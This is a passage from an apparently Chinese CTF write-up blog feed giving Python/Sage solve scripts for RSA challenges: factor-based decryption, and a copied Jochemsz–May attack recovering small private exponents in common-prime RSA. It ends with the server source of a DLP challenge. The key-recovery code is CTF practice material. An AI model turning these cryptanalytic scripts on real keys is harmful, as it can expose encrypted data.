class="number">12070143594653383247502692874778106348714756499944088142297957774407912084386999509410320243353742982293838487484081050538990367302357976177102579516488339</span>, <span class="number">1048549366056597739591152929803874363854681530785830253515089118350964042051436839357671097483244928214966056844703321007065289246949542010413511655191819</span>), (<span class="number">1080964507638536733985356789347796624092172684708512143174818283836033139914222447060140749704597343095726230029625234129726466518911684373356338739570181</span>, <span class="number">2433281645007141582183862407317654444588962316393305402059147986732894187771637619833973091546281143641628089412544201487854764031271379028103394293365395</span>, <span class="number">7333459333217190130016477147712864736110634259188514649323008545095540931148411984733549674748980909944668490369618657344762421815049496672804284626793739</span>), (<span class="number">1080964507638536733985356789347796624092172684708512143174818283836033139914222447060140749704597343095726230029625234129726466518911684373356338739570181</span>, <span class="number">9137185609978440131970874906420577508328645226689502090920928708593776202808411108234910240629732857486644018505787226914731705437244664001320218796407443</span>, <span class="number">629555368245891580229464648609941672370951348892317960461227823234658916111638496332612525665529196099652561276375631917885480409076211699587460123751691</span>), (<span class="number">7919489015169557662429127754565768355549835525176027430319638757565113735078207393658554845331317666676034000955470463920503224389516790946448824722679301</span>, <span class="number">1802354785201290177466884084338089546571783201683146314594751112680946785671485962333750690939270314498621839653134209205738944793709927368604997459819155</span>, <span class="number">1938968369951956383692914074846193565952605977994141608508479664130135156436350531430956937073490508744644524832859364144490425643565423141221879893357835</span>), (<span class="number">7919489015169557662429127754565768355549835525176027430319638757565113735078207393658554845331317666676034000955470463920503224389516790946448824722679301</span>, <span class="number">8506258750172588727253896583441012610311466111979343003456531834541828800708259450734687840022722028343637768746377234632615886199683212341821821962861203</span>, <span class="number">8642872334923254933479926573949116629692288888290338297370260385991017171473124019831894086156942222589660453926102389571367367049538708114438704396399883</span>), (<span class="number">1215585050198259112642115255462845291810152614879830741457858035704231720041433905257617696247865952831018071862227438493626282983543505973232000219637253</span>, <span class="number">5573300765497645611722078615083483769925354838724756952079502768727692919129671049559277837298711903536443299768083411008357224334569900166039461242780307</span>, <span class="number">8223878337112548774118238292755183938208558706396826004316399090874712045533325676806835514339226490474346958357774700482187558211665377803612652864959755</span>), (<span class="number">1215585050198259112642115255462845291810152614879830741457858035704231720041433905257617696247865952831018071862227438493626282983543505973232000219637253</span>, <span class="number">12277204730468944161509091114186406833665037749020953640941283490588574934166444537960214986382163617381459228861326436435234165740543185139256285745822355</span>, <span class="number">1519974372141250224331225793652260874468875796100629315454618369013830030496552188405898365255774776629331029264531675055310616805692092830395828361917707</span>), (<span class="number">7734921245373868987957633397815241793128376406577702659406870494917041423397863464444263406492935867521512547965938537313634187669740963333142964343301637</span>, <span class="number">2039677277102509201846962486845547473896091736477285128799254489086577739322976113889959601594776791686842028494481573651372391063246536352650723217029779</span>, <span class="number">1257898532286632316712997010434751098568684325677402896642438617119803235501528656939875312897703963741941819407675370807672885257529089521223286466966795</span>), (<span class="number">7734921245373868987957633397815241793128376406577702659406870494917041423397863464444263406492935867521512547965938537313634187669740963333142964343301637</span>, <span class="number">8743581242073807751633974985948470537635774646773481817661035210947459754359749602290896750678228505531857957587724599078249332469219821325867547720071827</span>, <span class="number">7961802497257930866500009509537674162308367235973599585504219338980685250538302145340812461981155677586957748500918396234549826663502374494440110970008843</span>), (<span class="number">1031017280402570438170620898712318729388693496281505970545089773056159408361089976043326257409484153676496618872695511886757246263767678359926139840259589</span>, <span class="number">5810623257398864636102157017590941697249663373518895766284006145133323872781161201115486747954218380724663488609430775453990670604106509150085186999990931</span>, <span class="number">7542808499447224707138321228343741470824637054080087292450358043864380124598503802315753890163439945471644252932590707145370017825629044183614059438568715</span>), (<span class="number">1031017280402570438170620898712318729388693496281505970545089773056159408361089976043326257409484153676496618872695511886757246263767678359926139840259589</span>, <span class="number">12514527222370163185889169516693864760989346283815092455145786866994205887817934689516423897037670094569679417702673800880867612010079794123302011503032979</span>, <span class="number">838904534475926157351308729240818407084954143783890603588577322003498109561730313914816741079988231626628323839347681718493076419655759210397234935526667</span>), (<span class="number">7934321504151848016580521002574844336171226047598370838640120531140912301800737265546469106621426048099833677640004660227767453182195309874035552908895749</span>, <span class="number">5362971084215426487776063906406933038339571667412402912065006500619578380006904603808786641086852920091627867874069854414757781438101918802034898550045331</span>, <span class="number">1748900714192807249109317611158943830937830460558493754638072787623072613667437058549182782275056393635453630420046451180946795578565976628109405510595851</span>), (<span class="number">7934321504151848016580521002574844336171226047598370838640120531140912301800737265546469106621426048099833677640004660227767453182195309874035552908895749</span>, <span class="number">12066875049186725037563076405509856102079254577708599600926787222480460395043678092209723790170304633936643796967312879841634722844075203775251723053087379</span>, <span class="number">8452804679164105798896330110261866894677513370854690443499853509483954628704210546950119931358508107480469559513289476607823736984539261601326230013637899</span>), (<span class="number">1230417539180549466793508503471921272431543137302174149778339809280030286763963777145531957537974334254817748546761634800890511776222024900818728405853701</span>, <span class="number">2430013099540483372244245938049404197953460394157816860687977434805442498428316202633376638362842795284433398895776030790499119572988606626252537829964435</span>, <span class="number">1329906716382101089747629329965011139454100278664981461584211492506767487727638715524124210457340661520140134851718762091766986740692646317283353979155723</span>), (<span class="number">1230417539180549466793508503471921272431543137302174149778339809280030286763963777145531957537974334254817748546761634800890511776222024900818728405853701</span>, <span class="number">9133917064511781922031258437152327261693143304454013549549758156666324513465089691034313787446294509129449327989019056217376060978961891599469362333006483</span>, <span class="number">8033810681353399639534641829067934203193783188961178150445992214367649502764412203925061359540792375365156063944961787518643928146665931290500178482197771</span>)]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> p, q, d <span class="keyword">in</span> sol_list:</span><br><span class="line">    <span class="keyword">if</span> (n % p == <span class="number">0</span>):</span><br><span class="line">        q = n // p</span><br><span class="line">        d = inverse(e, (p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line">        m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line">        <span class="built_in">print</span>(long_to_bytes(m))</span><br><span class="line">    p, q = q, p</span><br><span class="line">    <span class="keyword">if</span> (n % p == <span class="number">0</span>):</span><br><span class="line">        q = n // p</span><br><span class="line">        d = inverse(e, (p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line">        m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line">        <span class="built_in">print</span>(long_to_bytes(m))</span><br><span class="line">    </span><br></pre></td></tr></table></figure>
<h3 id="common_rsa">common_rsa</h3>
<p>维纳的common prime rsa，用john and
may的方法copper能出，代码直接用github的：https://github.com/jvdsn/crypto-attacks/blob/5c7989ceac599f1f8e016b5afb0d2966759cd470/attacks/rsa/wiener_attack_common_prime.py</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> log</span><br><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> sqrt</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> sage.<span class="built_in">all</span> <span class="keyword">import</span> RR</span><br><span class="line"><span class="keyword">from</span> sage.<span class="built_in">all</span> <span class="keyword">import</span> ZZ</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line">path = os.path.dirname(os.path.dirname(os.path.dirname(os.path.realpath(os.path.abspath(__file__)))))</span><br><span class="line"><span class="keyword">if</span> sys.path[<span class="number">1</span>] != path:</span><br><span class="line">    sys.path.insert(<span class="number">1</span>, path)</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> shared.small_roots <span class="keyword">import</span> jochemsz_may_integer</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">attack</span>(<span class="params">N, e, delta=<span class="number">0.25</span>, m_start=<span class="number">1</span></span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Recovers the prime factors of a modulus and the private exponent if the private exponent is too small (Common Prime RSA version).</span></span><br><span class="line"><span class="string">    More information: Jochemsz E., May A., &quot;A Strategy for Finding Roots of Multivariate Polynomials with New Applications in Attacking RSA Variants&quot; (Section 5)</span></span><br><span class="line"><span class="string">    :param N: the modulus</span></span><br><span class="line"><span class="string">    :param e: the public exponent</span></span><br><span class="line"><span class="string">    :param delta: a predicted bound on the private exponent (d &lt; N^delta) (default: 0.25)</span></span><br><span class="line"><span class="string">    :param m_start: the m value to start at for the small roots method (default: 1)</span></span><br><span class="line"><span class="string">    :return: a tuple containing the prime factors of the modulus and the private exponent</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    gamma = <span class="number">1</span> - log(e, N)</span><br><span class="line">    <span class="keyword">assert</span> delta &lt;= <span class="number">1</span> / <span class="number">4</span> * (<span class="number">4</span> + <span class="number">4</span> * gamma - sqrt(<span class="number">13</span> + <span class="number">20</span> * gamma + <span class="number">4</span> * gamma ** <span class="number">2</span>)), <span class="string">&quot;Bound check failed.&quot;</span></span><br><span class="line"></span><br><span class="line">    x, y, z = ZZ[<span class="string">&quot;x, y, z&quot;</span>].gens()</span><br><span class="line"></span><br><span class="line">    f = e ** <span class="number">2</span> * x ** <span class="number">2</span> + e * x * (y + z - <span class="number">2</span>) - (y + z - <span class="number">1</span>) - (N - <span class="number">1</span>) * y * z</span><br><span class="line"></span><br><span class="line">    X = <span class="built_in">int</span>(RR(N) ** delta)</span><br><span class="line">    Y = <span class="built_in">int</span>(RR(N) ** (delta + <span class="number">1</span> / <span class="number">2</span> - gamma))</span><br><span class="line">    Z = <span class="built_in">int</span>(RR(N) ** (delta + <span class="number">1</span> / <span class="number">2</span> - gamma))</span><br><span class="line">    W = <span class="built_in">int</span>(RR(N) ** (<span class="number">2</span> + <span class="number">2</span> * delta - <span class="number">2</span> * gamma))</span><br><span class="line"></span><br><span class="line">    m = m_start</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">for</span> t <span class="keyword">in</span> <span class="built_in">range</span>(m + <span class="number">1</span>):</span><br><span class="line">            logging.info(<span class="string">f&quot;Trying m = <span class="subst">&#123;m&#125;</span>, t = <span class="subst">&#123;t&#125;</span>...&quot;</span>)</span><br><span class="line">            strategy = jochemsz_may_integer.ExtendedStrategy([t, <span class="number">0</span>, <span class="number">0</span>])</span><br><span class="line">            <span class="keyword">for</span> x0, y0, z0 <span class="keyword">in</span> jochemsz_may_integer.integer_multivariate(f, m, W, [X, Y, Z], strategy):</span><br><span class="line">                d = x0</span><br><span class="line">                ka = y0</span><br><span class="line">                kb = z0</span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">pow</span>(<span class="built_in">pow</span>(<span class="number">2</span>, e, N), d, N) == <span class="number">2</span>:</span><br><span class="line">                    p = (e * d - <span class="number">1</span>) // kb + <span class="number">1</span></span><br><span class="line">                    q = (e * d - <span class="number">1</span>) // ka + <span class="number">1</span></span><br><span class="line">                    <span class="keyword">return</span> p, q, d</span><br><span class="line"></span><br><span class="line">        m += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">n = <span class="number">253784908428481171520644795825628119823506176672683456544539675613895749357067944465796492899363087465652749951069021248729871498716450122759675266109104893465718371075137027806815473672093804600537277140261127375373193053173163711234309619016940818893190549811778822641165586070952778825226669497115448984409</span></span><br><span class="line">e = <span class="number">31406775715899560162787869974700016947595840438708247549520794775013609818293759112173738791912355029131497095419469938722402909767606953171285102663874040755958087885460234337741136082351825063419747360169129165</span></span><br><span class="line">c = <span class="number">97724073843199563126299138557100062208119309614175354104566795999878855851589393774478499956448658027850289531621583268783154684298592331328032682316868391120285515076911892737051842116394165423670275422243894220422196193336551382986699759756232962573336291032572968060586136317901595414796229127047082707519</span></span><br><span class="line">delta = <span class="number">0.132</span></span><br><span class="line"><span class="built_in">print</span>(delta)</span><br><span class="line">p, q, d = attack(n, e, delta)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">pow</span>(c, d, n))) </span><br><span class="line"> </span><br></pre></td></tr></table></figure>
<h3 id="babydlp">babyDLP</h3>
<p>CryptoCTF
（这比赛哥们是第十一名）原题sidestep，参数交互都没改，直接用原来的exp都能出：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> random, sys</span><br><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pow_d</span>(<span class="params">g, e, n</span>):</span><br><span class="line">    t, r = <span class="number">0</span>, <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">bin</span>(e)[<span class="number">2</span>:]:</span><br><span class="line">        <span class="keyword">if</span> r == <span class="number">4</span>: t += <span class="number">1</span></span><br><span class="line">        r = <span class="built_in">pow</span>(r, <span class="number">2</span>, n)</span><br><span class="line">        <span class="keyword">if</span> _ == <span class="string">&#x27;1&#x27;</span>: r = r * g % n</span><br><span class="line">    <span class="keyword">return</span> t, r</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ts</span>(<span class="params">m, p</span>):</span><br><span class="line">    m = m % p</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">pow</span>(m, (p - <span class="number">1</span>) // <span class="number">2</span>, p) == <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">die</span>(<span class="params">*args</span>):</span><br><span class="line">    pr(*args)</span><br><span class="line">    quit()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pr</span>(<span class="params">*args</span>):</span><br><span class="line">    s = <span class="string">&quot; &quot;</span>.join(<span class="built_in">map</span>(<span class="built_in">str</span>, args))</span><br><span class="line">    sys.stdout.write(s + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">    sys.stdout.flush()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sc</span>():</span><br><span class="line">    <span class="keyword">return</span> sys.stdin.readline().strip()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    border = <span class="string">&quot;|&quot;</span></span><br><span class="line">    pr(border*<span class="number">72</span>)</span><br><span class="line">    pr(border, <span class="string">&quot;Hi all cryptographers! Welcome to the Sidestep task, we do powing!!!&quot;</span>, border)</span><br><span class="line">    pr(border, <span class="string">&quot;You should solve a DLP challenge in some special way to get the flag&quot;</span>, border)</span><br><span class="line"></span><br><span class="line">    p = <span class="number">2</span> ** <span class="number">1024</span> - <span class="number">2</span> ** <span class="number">234</span> - <span class="number">2</span> ** <span class="number">267</span> - <span class="number">2</span> ** <span class="number">291</span> - <span class="number">2</span> ** <span class="number">403</span> - <span class="number">1</span></span><br><span class="line">    s = random.randint(<span class="number">2</span>, (p - <span class="number">1</span>) // <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        pr(<span class="string">&quot;| Options: \n|\t[T]ry the magic machine \n|\t[Q]uit&quot;</span>)</span><br><span class="line">        ans = sc().lower()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ans == <span class="string">&#x27;t&#x27;</span>:</span><br><span class="line">            pr(border, <span class="string">&quot;please send your desired integer: &quot;</span>)</span><br><span class="line">            g = sc()</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                g = <span class="built_in">int</span>(g)</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                die(border, <span class="string">&quot;The given input is not integer!&quot;</span>)</span><br><span class="line">            <span class="keyword">if</span> ts(g, p):</span><br><span class="line">                t, r = pow_d(g, s, p)</span><br><span class="line">                <span class="keyword">if</span> r == <span class="number">4</span>:</span><br><span class="line">                    die(border, <span class="string">f&#x27;Great! you got the flag: <span class="subst">&#123;flag&#125;</span>&#x27;</span>)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    pr(border, <span class="string">f&quot;t, r = <span class="subst">&#123;t, r&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                pr(border, <span class="string">&quot;The given base is NOT valid!!!&quot;</span>)</span><br><span class="line">        <span class="keyword">elif</span> ans == <span class="string">&#x27;q&#x27;</span>:</span><br><span class="line">            die(border, <span class="string">&quot;Quitting ...&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            die(border, <span class="string">&quot;Bye bye ...&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>RSA</tag>
      </tags>
  </entry>
</search>
